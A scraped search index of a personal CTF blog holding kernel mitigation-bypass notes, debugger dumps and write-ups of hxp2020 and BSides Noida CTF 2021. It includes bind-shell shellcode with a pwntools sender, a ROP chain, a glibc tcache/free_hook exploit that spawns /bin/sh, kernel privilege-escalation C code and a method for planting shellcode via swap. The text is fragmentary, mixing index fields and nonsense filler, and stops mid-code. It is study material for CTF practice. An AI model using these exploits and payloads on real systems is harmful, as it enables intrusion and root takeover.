mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw topoext ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 xsaves clzero wbnoinvd arat umip pku ospke vaes vpclmulqdq rdpid overflow_recov succor Along with SMEP, there are several ways to bypass them Use kernel gadgets to do ROP tamper CR4 register. By zero out high bits of CR4, we can disable kernel SMEP and SMAP mitigation. ret-to-direct-mapped memory (short as ret2dir). Ideas come from [3]. Memory users maped will be identically copied into physmap, see [4] for more about ram layout. So when SMAP and SMEP are enabled, we can actually jump to our codes in physmap to execute user mode codes. More details are in the original thesis and [5]. overwrite vdso (Virtual Dynamic Shared Object). vDSO is a chunk of memory used for making glibc and kernel compatible[6]. Typically, vDSO is r/w in kernel mode and r/x in user mode. So if we can modify vDSO to our shellcode in kernel mode and trigger codes in vDSO in user mode (basically gettimeofday() will automatically do this), we can execute codes in root privilege. If vDSO is not permitted to write, we can use set_memory_rw() to set area authority flag. More details in [7] and [8]. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:5:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x05 mmap_min_addr mmap_min_addr is a system value set to constrain the minimum address users can mmap to. This restriction prevents kernel from null pointer dereferences. x1do0@x1do0:~$ cat /proc/sys/vm/mmap_min_addr 65536 ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:6:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x06 KPTI Used to separate user page table and kernel page table, which means not only cs, ss regiseters should be set properly when return to user mode from ring 0, but also gs register. swapgs should be executed before iret. *RAX 0x1001 *RBX 0x1614000 ◂— 0 *RCX 0x1614000 ◂— 0 *RDX 0x1615000 *RDI 0x705820 ◂— 0 *RSI 0x1615000 *R8 0x0 *R9 0x0 *R10 0x0 *R11 0x297 *R12 0x1613ff0 ◂— 0x540 *R13 0x1 R14 0x0 *R15 0x1 *RBP 0x1614000 ◂— 0 *RSP 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax *RIP 0xffffffff81c00aaf ◂— swapgs ────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── ► 0xffffffff81c00aaf swapgs 0xffffffff81c00ab2 nop dword ptr [rax] 0xffffffff81c00ab5 jmp 0xffffffff81c00ae0 \u003c0xffffffff81c00ae0\u003e ↓ 0xffffffff81c00ae0 test byte ptr [rsp + 0x20], 4 0xffffffff81c00ae5 jne 0xffffffff81c00ae9 \u003c0xffffffff81c00ae9\u003e 0xffffffff81c00ae7 iretq 0xffffffff81c00ae9 push rdi 0xffffffff81c00aea swapgs 0xffffffff81c00aed nop dword ptr [rax] 0xffffffff81c00af0 nop 0xffffffff81c00af2 mov rdi, cr3 ────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────── 00:0000│ rsp 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax 01:0008│ 0xfffffe0000002fe0 ◂— 0x33 /* '3' */ 02:0010│ 0xfffffe0000002fe8 ◂— 0x202 03:0018│ 0xfffffe0000002ff0 —▸ 0x7fffd2abf100 ◂— 0x20 /* ' ' */ 04:0020│ 0xfffffe0000002ff8 ◂— 0x2b /* '+' */ 05:0028│ 0xfffffe0000003000 ◂— add byte ptr [rax], al 06:0030│ 0xfffffe0000003008 ◂— add dh, bh 07:0038│ 0xfffffe0000003010 ◂— add cl, cl ──────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────── ► f 0 0xffffffff81c00aaf f 1 0x400eea f 2 0x33 f 3 0x202 f 4 0x7fffd2abf100 f 5 0x2b f 6 0x300000000000 f 7 0x1ac000fffffe00 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e info registers rax 0x1001 4097 rbx 0x1614000 23150592 rcx 0x1614000 23150592 rdx 0x1615000 23154688 rsi 0x1615000 23154688 rdi 0x705820 7362592 rbp 0x1614000 0x1614000 rsp 0xfffffe0000002fd8 0xfffffe0000002fd8 r8 0x0 0 r9 0x0 0 r10 0x0 0 r11 0x297 663 r12 0x1613ff0 23150576 r13 0x1 1 r14 0x0 0 r15 0x1 1 rip 0xffffffff81c00aaf 0xffffffff81c00aaf eflags 0x6 [ IOPL=0 PF ] cs 0x10 16 ss 0x0 0 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 fs_base 0x705418 7361560 gs_base 0xffff88801f000000 -131391119425536 k_gs_base 0x0 0 you can see that this instruction simply does xchg gs_base, k_gs_base. After swapgs, page locations are switched between user mode and kernel mode. RAX 0x1001 RBX 0x1614000 ◂— 0 RCX 0x1614000 ◂— 0 RDX 0x1615000 RDI 0x705820 ◂— 0 RSI 0x1615000 R8 0x0 R9 0x0 R10 0x0 R11 0x297 R12 0x1613ff0 ◂— 0x540 R13 0x1 R14 0x0 R15 0x1 RBP 0x1614000 ◂— 0 RSP 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax *RIP 0xffffffff81c00ab2 ◂— nop dword ptr [rax] ────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── 0xffffffff81c00aaf swapgs ► 0xffffffff81c00ab2 nop dword ptr [rax] 0xffffffff81c00ab5 jmp 0xffffffff81c00ae0 \u003c0xffffffff81c00ae0\u003e ↓ 0xffffffff81c00ae0 test byte ptr [rsp + 0x20], 4 0xffffffff81c00ae5 jne 0xffffffff81c00ae9 \u003c0xffffffff81c00ae9\u003e 0xffffffff81c00ae7 iretq 0xffffffff81c00ae9 push rdi 0xffffffff81c00aea swapgs 0xffffffff81c00aed nop dword ptr [rax] 0xffffffff81c00af0 nop 0xffffffff81c00af2 mov rdi, cr3 ────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────── 00:0000│ rsp 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax 01:0008│ 0xfffffe0000002fe0 ◂— 0x33 /* '3' */ 02:0010│ 0xfffffe0000002fe8 ◂— 0x202 03:0018│ 0xfffffe0000002ff0 —▸ 0x7fffd2abf100 ◂— 0x20 /* ' ' */ 04:00","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:7:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["Pause-and-Ponder"],"content":"Refreshed by X1do0 prelude of the new theme demo babble ","date":"2021-08-25","objectID":"/2021/08/first_post/:0:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"Loop free Cuz it’s hard for me, I will find only time will tell I will figure out. ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"lbwnb waf waf ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:1","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"「lbwnb」 gang gang ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:2","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"aka asdknas from pwn import * sc= b\"\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc9\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf2\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; io = remote(\"rookie_s**t\", 123) io.sendline(sc) io.interactive() #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e unsigned char shellcode[] = \\ \"\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc9\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf2\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; void main(int argc, char *argv[]) { /* Default port at 28th and 29th byte index: \\x11\\x5c */ // in case no port is provided the default would be used if (argc \u003c 2) { printf(\"No port provided, 4444 (0x115c will be used)\\n\"); } else { int port = atoi(argv[1]); printf(\"Binding to %d (0x%x)\\n\", port, port); unsigned int p1 = (port \u003e\u003e 8) \u0026 0xff; unsigned int p2 = port \u0026 0xff; // printf(\"%x %x\\n\", p1, p2); shellcode[28] = (unsigned char){p1}; shellcode[29] = (unsigned char){p2}; // printf(\"%x %x\", shellcode[28], shellcode[29]); } int (*ret)() = (int(*)())shellcode; ret(); } / $ /exp [+] open ko, return 3 [*] try to read from kernel, return 320 [*] kernel base is ffffffff95200000 [*] Reg saved cs = 33, ss = 2b, flags = 206, user_sp = 7ffce5505978 [*] Prepared payload to overwrite modprobe_path [*] Returned to userland, setting up for fake modprobe [*] Run unknown file /tmp/dummy: line 1: ����: not found [*] Hopefully flag is readable flag{TEST} ","date":"2021-08-25","objectID":"/2021/08/first_post/:2:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"kak Note\r\r一个 注意 横幅\r\r Abstract\r\r一个 摘要 横幅\r\r Info\r\r一个 信息 横幅\r\r Tip\r\r一个 技巧 横幅\r\r Success\r\r一个 成功 横幅\r\r Question\r\r一个 问题 横幅\r\r Warning\r\r一个 警告 横幅\r\r Failure\r\r一个 失败 横幅\r\r Danger\r\r一个 危险 横幅\r\r Bug\r\r一个 Bug 横幅\r\r Example\r\r一个 示例 横幅\r\r Quote\r\r一个 引用 横幅\r\r ","date":"2021-08-25","objectID":"/2021/08/first_post/:3:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"中文测试 别吵别吵别吵，你可能以为我在第一层，实际上我是1145141919810欧洗给欧洗给haoduoyinliugou好想做嘉然小姐的狗歪比巴卜两面包夹芝士看我一个空中劈叉飞龙骑脸怎么输A1高闪来一个秋梨膏异世相遇尽享美味777777若风一指若风一指吼吼吼全给党为你打calllllll李吼那么大声干甚么今生立誓以你为王吾王剑锋所指是我永恒不变的信仰欧拉欧拉木大木大你们有为roselia赌上一切的觉悟吗这一刻我充满了决心小朋友们大家好我是你们的好朋友金坷垃肥料资源不缺乏必须要有faq此生无悔入东方，来世愿为蓝蓝路先有老菊后有天太阳骑士日神仙哈喽大家好欢迎来到籽岷的minecraft游戏世界我从未见过如此厚颜无耻之人乌鸦坐飞机什么是快乐星球贵州和广西相比大家好，我叫张全蛋，我的英文名叫挖掘机技术哪家强，山东技校找烤面筋香香的滴口味你尝过没不如去问问神奇海螺吧欧巴刚弄死他我不是针对你我是说在座的所有人我卢本伟没有开挂基尼太美，林北66CCFF如果我有十点法力水晶我能在河边钓上一整天的杰哥不要awsl来房里有好康的可以教你蓝瘦香菇给力嗷铁子奥利给老铁双击666我爸是李刚两面包夹芝士我的头发乌黑浓乌鱼子乌鱼子乌鱼子乌鱼子绝绝子绝绝子绝绝子绝绝子这位更是重量级 ","date":"2021-08-25","objectID":"/2021/08/first_post/:4:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"友链测试 Thanks for your splendid theme, I mainly edited on this. \rDillon\rAuthor of the theme\r\r\r\rAlso, Banerya does make a difference by helping me debug my codes from remote devices during my blog migration. I have encontered some confusing problems about tty and woff on my website, which now turns out that my system configuration is to blame. Thanks for your patience, it really helps me a lot. \rBanerya\rHarbin Institute of Technology\r\r\r\rMore work needs to be done, currently I’m trying to move all of my blogs hitheto to here. So far so goooood… Warning\r\r施工中…\r\r","date":"2021-08-25","objectID":"/2021/08/first_post/:5:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["PWN"],"content":"Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again. It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it’s time to solve these left challenges. ","date":"2021-08-23","objectID":"/2021/08/hxp2020/:0:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"kernel-rop | 6 solved | 667 points The kernel insmod a bugged module “hackme”, which has open/read/write functions. In read function, It reads from kernel stack starting from tmp (rbp - 0x20h) with a size no more than 0x1000, and copy to user. However tmp is just 0x20 bytes long, which can cause some memory leaking on kernel stack. ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off) { unsigned __int64 v4; // rdx unsigned __int64 v5; // rbx bool v6; // zf ssize_t result; // rax int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v9; // [rsp+80h] [rbp-20h] _fentry__(f, data, size, off); v5 = v4; v9 = __readgsqword(0x28u); _memcpy(hackme_buf, tmp); if ( v5 \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL, v5); BUG(); } _check_object_size(hackme_buf, v5, 1LL); v6 = copy_to_user(data, hackme_buf, v5) == 0; result = -14LL; if ( v6 ) result = v5; return result; } Same in write function, we can copy really long buffer to the kernel stack, causing stack overflow in kernel space. ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off) { unsigned __int64 v4; // rdx ssize_t v5; // rbx int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v8; // [rsp+80h] [rbp-20h] _fentry__(f, data, size, off); v5 = v4; v8 = __readgsqword(0x28u); if ( v4 \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 0x1000LL, v4); BUG(); } _check_object_size(hackme_buf, v4, 0LL); if ( copy_from_user(hackme_buf, data, v5) ) return -14LL; _memcpy(tmp, hackme_buf); return v5; } Sounds like quite easy and straightforward, we can leak address to get the kernel image base, compute commit_creds and prepare_kernel_cred function address and using ROP to get root, just like the challenge name “kernel ROP”. Well, no. If you consider this challenge as a normal KALSR and smep bypass, you will fail for sure. Firstly of course, we edit the init file to debug the kernel and print out address of commit_creds like below. / $ cat /proc/kallsyms | grep commit_creds ffffffffb614d360 T commit_creds ffffffffb6987d90 r __ksymtab_commit_creds ffffffffb69a0972 r __kstrtab_commit_creds ffffffffb69a4d42 r __kstrtabns_commit_creds / $ cat /proc/kallsyms | grep prepare_kernel_cred ffffffffb6096750 T prepare_kernel_cred ffffffffb698d4fc r __ksymtab_prepare_kernel_cred ffffffffb69a09b2 r __kstrtab_prepare_kernel_cred ffffffffb69a4d42 r __kstrtabns_prepare_kernel_cred And when we exit and do this again, wierd thing happens. / $ cat /proc/kallsyms | grep commit_creds ffffffff8ea7cc90 T commit_creds ffffffff8f587d90 r __ksymtab_commit_creds ffffffff8f5a0972 r __kstrtab_commit_creds ffffffff8f5a4d42 r __kstrtabns_commit_creds / $ cat /proc/kallsyms | grep prepare_kernel_cred ffffffff8eb2b4a0 T prepare_kernel_cred ffffffff8f58d4fc r __ksymtab_prepare_kernel_cred ffffffff8f5a09b2 r __kstrtab_prepare_kernel_cred ffffffff8f5a4d42 r __kstrtabns_prepare_kernel_cred The addresses does change, but we know that KASLR adds a random offset aligning to page size which means at least low bits should not change. What’s going on? After several frustrating hours, I found the reason. In Jun 2020, the patch [2] added one of the most annoying mitigation against kernel exploits: Function Granular Kernel Address Space Layout Randomization (fgkaslr). It rearranges kernel code at load time on a per-function level granularity, which means every function address can be different when loaded. Seems like this challenge is unexploitable. But suddenly, I found that not all the functions are rearranged, like __ksymtab_commit_creds just printed out above! So are there any relation between __ksymtab_commit_creds and commit_creds? I found out that every kernel symbol has a structure below, in which value_offset actually stored offset between address of the symbol and specific function. So if we get value_offset of __ksymtab_commit_creds, we can add to it and get the real address of commit_creds! truct kernel_symbol { int value_o","date":"2021-08-23","objectID":"/2021/08/hxp2020/:1:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"pfoten | 18 solves | 370 points A challenge containing no bug module or driver. Note: The kernel is a standard Linux kernel, we didn’t add any vulnerabilities. Sounds like problems can only be found in init file x1do0@x1do0:~/kernel_learning/pfoten$ cat ./files/etc/init.d/rcS #!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026\u0026 mount -t proc none /proc mkdir -p /dev \u0026\u0026 mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026\u0026 mount -t tmpfs tmpfs /tmp umask 111 dd if=/dev/zero bs=1M count=10 of=/swap status=none losetup /dev/loop0 /swap mkswap /dev/loop0 \u003e/dev/null swapon /dev/loop0 \u003e/dev/null I didn’t quite familiar with linux bash grammar. After looking for some information, I finally found out what he did. set mask of file mode creation[4] as 111, which means all users can open and read the following files created. add a 10MB size file /swap, filled with zero correlate /dev/loop0 with /swap using losetup[5] construct a swap space in loop0 using kaswap[6] and enable by swapon But to fully understand the meanings, we should go deep into linux swap files[7]. Shortly, swap files is a cache for physical RAM. When RAM memory is insufficient, kernel will copy some memory to swap files on the hard disk temporarily in order to leave more memory in RAM. So you might find the bugs here too. Swap files should never be directly writed by users because when the swap operation happens between RAM and swap files, deliberately constructed data writed in swap files will be directly copy to RAM memory! Let’s see what will happen if we keep mmaping to occupy virtual memory. #include \u003cstdio.h\u003e#include \u003cmemory.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/mman.h\u003e int main(int argc, char const *argv[]) { for (int i = 0; ; ++i) { char* buffer = mmap(NULL, 1024*1024, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); memset(buffer, 'A', 1024*1024); printf(\"%d\\n\", i); system(\"strings /swap\"); } return 0; } / $ /poc \u003e /tmp/out [ 39.624986] Out of memory: Killed process 79 (poc) total-vm:45108kB, anon-rss:40kB, file-rss:4kB, shmem-rss:36004kB,0 Killed / $ vi /tmp/out After a few iterations, swap file will be filled with other things, which is actually some infrequently used memory staff. ... bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H bq|H GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 stapsdt libc lll_lock_wait_private 8@%rdi stapsdt libc memory_mallopt_arena_max 8@%rax 8@32+mp_(%rip) stapsdt libc memory_mallopt_arena_test 8@%rax 8@24+mp_(%rip) stapsdt ... Aug 23 02:05:37 \u003c30\u003eAug 23 02:05:37 nit: starting pid 78, tty '': '-setuidgid 1 sh' starting pid 78, tty '': '-setuidgid 1 sh' ::sysinit:/etc/init.d/rcS ::once:-setuidgid 1 sh #!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026\u0026 mount -t proc none /proc mkdir -p /dev \u0026\u0026 mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026\u0026 mount -t tmpfs tmpfs /tmp umask 111 dd if=/dev/zero bs=1M count=10 of=/swap status=none losetup /dev/loop0 /swap mkswap /dev/loop0 \u003e/dev/null swapon /dev/loop0 \u003e/dev/null D$(t L$8H []A\\A]A^ AWAVI AUATI []A\\A]A^A_ ATUI []A\\ ... You can see that even the memory of this ELF executable file was dumped into /swap. According to Mr.2019[8], we can garble the init or exit process of busybox to shellocode, cuz they are running on root privelege. After compiling busybox with symbols, we can find specific sequences which indicate where the functions are and whether the memory is swaped into /swap. I tried but it didn’t work for me, finding the sequences is a probablistic incident (actually quite rare). And even when I found the sequences after tons of failure, shellcode I write was not triggered at all. I discussed with my fellow teammate pu1p[9]. He found that edit syscall function can gain much higher probability to trigger shellcode we write. It turned out the same on my machine. What’s more, we use exit machine code as a needle to indicate where the exit is and whether it’s swaped. 0: 48 63 ff movsxd rdi, edi 3: b8 e7 00 00 0","date":"2021-08-23","objectID":"/2021/08/hxp2020/:2:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺 url: https://ctftime.org/event/1397 rank 8 with lilac babystack: static link, find gadget to trigger your own syscall and ROP warmup: glibc2.32 (lastest version) tcache exploitation, xor bypass khop: basic linux kernel exploits, use-after-free and zero deference babymusl: musl libc heap exploits, unlink vulnerability and ROP suscall: basic linux kernel exploits, bugged syscall implemented by host trash: glibc2.32 off-by-null, trigger heap overlapping and double free Interpreter: virtual machine exploits, out-of-bound read and write ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:0:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"babystack 明显的栈溢出。 静态编译，什么gadget都有，syscall只开了orw，但是并没有找到open。 那就自己凑syscall吧 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context.arch = 'amd64' # io = process(\"./babystack.out\") io = remote(\"34.136.150.230\", 49156) context.log_level = 'debug' open64 = 0x442BA0 read = 0x442CD0 write = 0x442D70 prdir = 0x00000000004018f4 prsir = 0x000000000040970e prdxr = 0x000000000040182f praxr = 0x0000000000410da4 mov_rax_rdi_ret = 0x0000000000413b14 syscall = 0x442D85 mprotect = 0x443AF0 target = 0x4bc000 rop = flat( prdir, 0, prsir, target+0x50, prdxr, 0x10, read, prdir, target+0x50, prsir, 0, praxr, 2, syscall, prdir, 3, prsir, target+0x100, prdxr, 0x30, read, prdir, 1, prsir, target+0x100, prdxr, 0x30, write) # gdb.attach(io, \"b *0x442D85\") io.sendline('\\x00'*0x48 + rop) io.send(\"flag.txt\") io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:1:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"warmup 2.32的新版本堆，明显的uaf，增删改打印功能齐全。还是改tcache的fd，打到free_hook，但是需要绕过tcache的异或检测。只需要在分配第一个tcache时uaf泄露出fd位置，便是异或的key（一开始的fd是0）。 详见 https://cloud.tencent.com/developer/article/1643954 \"\"\" yty \u0026 wangjihe / Lilac \"\"\" import os import sys import time from pwn import * libc_path = \"/usr/lib/glibc/2.32-0ubuntu3_amd64/libc-2.32.so\" elf_path = \"./a.out\" gdb_args = ''' b *(0x555555554000 + 0x13B5) b *(0x555555554000 + 0x16A2) ''' context.arch = \"amd64\" if len(sys.argv) == 3: context.log_level = 'error' else: context.log_level = 'info' context.terminal = ['tmux', 'splitw', '-h'] context.binary = elf_path libc = ELF(libc_path) elf = ELF(elf_path) def tob(a): if isinstance(a, str): return bytes(a, encoding=\"utf-8\") else: return bytes(str(a), encoding=\"utf-8\") if len(sys.argv) == 1 or sys.argv[1] == \"d\": io = gdb.debug(context.binary.path, gdb_args) elif len(sys.argv) == 3: if isinstance(sys.argv[2], int): io = remote(sys.argv[1], sys.argv[2]) elif isinstance(sys.argv[2], str) or isinstance(sys.argv[2], bytes): io = remote(sys.argv[1], int(sys.argv[2])) elif sys.argv[1] == \"l\": io = process(context.binary.path) else: io = remote(\"34.136.150.230\", 49153) def choice(v): io.sendlineafter(b\"=6= exit\\n\", tob(v)) def add(idx, size, data=b\"\"): choice(1) io.sendlineafter(b\"idx: \", tob(idx)) io.sendlineafter(b\"sz: \", tob(size)) if size != 0: io.sendlineafter(b\"data: \", data) def show(idx): choice(2) io.sendlineafter(b\"idx: \", tob(idx)) def edit(idx, data): choice(3) io.sendlineafter(b\"idx: \", tob(idx)) io.sendlineafter(b\"data: \", data) def rm(idx): choice(4) io.sendlineafter(b\"idx: \", tob(idx)) def save(idx): choice(5) io.sendlineafter(\"idx: \", tob(idx)) add(0,0x18,b\"a\") add(1,0x500,b\"a\") add(2,0x18,b\"a\") # 0x55555555b6e0 add(3,0x18,b\"a\") rm(0) add(0,0) show(0) io.recvuntil(b\"data: \") key = u64(io.recv(5) + b'\\0'*3) print(hex(key)) rm(1) add(1,0) show(1) io.recvuntil(b\"data: \") libc.address = u64(io.recv(6) + b'\\0'*2) - 0x1e4030 print(hex(libc.address)) add(9,0x18,b\"a\") rm(9) save(2) rm(2) edit(2,p64(libc.symbols[\"__free_hook\"] ^ key)) add(4,0x18) add(5,0x18,p64(libc.symbols[\"system\"])) add(6,0x28,b\"/bin/sh\\0\") rm(6) io.interactive() ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:2:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"khop 全局变量message uaf，开两个fd，close其中一个，另外一个还可以接着用。 static ssize_t dev_read(struct file *fp, char *buf, size_t size, loff_t *off) { char kernel_stack[48]; int len = strlen(message); if (*off \u003e= len) { return 0; /* end of file */ } memcpy(kernel_stack, message, len); if(len \u003e size - *off) { len = size - *off; } if(copy_to_user(buf, kernel_stack + *off, len)) { return -EFAULT; } *off += len; return len; } 启动脚本特意关掉了mmap_min_addr，所以直接mmap到0地址处，控制内容导致copy_to_user时造成内核栈溢出。cr4的gadget没得，只能在内核栈上提权了。 需要绕过canary、smep、KPTI，直接swapgs_restore_regs_and_return_to_usermode一把梭 /* x1do0 / Lilac */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cfcntl.h\u003e#include \u003csys/ioctl.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003cerrno.h\u003e struct trap_frame{ void *rip; unsigned long long cs; unsigned long long eflags; void *rsp; unsigned long long ss; }__attribute__((packed)); struct trap_frame tf; unsigned long long tf_addr = \u0026tf; #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cc140; void* (*commit_creds)(void*) KERNCALL = 0xffffffff810cbdd0; uint64_t u64(char * s){ uint64_t result = 0; for (int i = 7 ; i \u003e=0 ;i--){ result = (result \u003c\u003c 8) | (0x00000000000000ff \u0026 s[i]); } return result; } void init_tf_work(void){ //__asm__ volatile(\".intel_syntax noprefix;\" // \"mov tf+8, cs;\" //set cs // \"pushf;pop tf+16;\" //set eflags // \"push rsp;pop tf+24;\" // \"mov tf+32, ss;\"); asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"movq %%rsp, %3;\\n\" \"pushfq\\n\" \"popq %2\\n\" : \"=r\"(tf.cs), \"=r\"(tf.ss), \"=r\"(tf.eflags), \"=r\"(tf.rsp) : : \"memory\"); tf.rip = 0xdeadbeef; tf.rsp -= 0; printf(\"[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx\\n\", tf.cs, tf.ss, tf.eflags, tf.rsp); } void get_shell(){ system(\"/bin/sh\"); } int main() { printf(\"[*] mmap at 0x100000, ret %x\\n\", mmap(0x100000, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0) ); int get_shell_64[] = {0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8; puts(\"[*] write shellocde\"); for(int i=0; i\u003csizeof(get_shell_64)/4 ;i++) { *(char *)(0x100000 + i) = get_shell_64[i]; } // extern int errno; int fd, fd2, exp_fd; fd = open(\"/dev/char_dev\", O_RDWR); fd2 = open(\"/dev/char_dev\", O_RDWR); exp_fd = open(\"/dev/char_dev\", O_RDWR); close(fd2); char *mem = mmap(0, 0x1000, 7, 50, -1, 0); char buffer[0x400]; memset(mem, '\\x00', 0x30); mem[0x30-1] = '\\n'; read(fd, buffer, 0x30-1); memset(mem, '\\x00', 0x30); mem[0x30] = '\\n'; // printf(\"[*] %d\\n\", lseek(fd, 0x28, 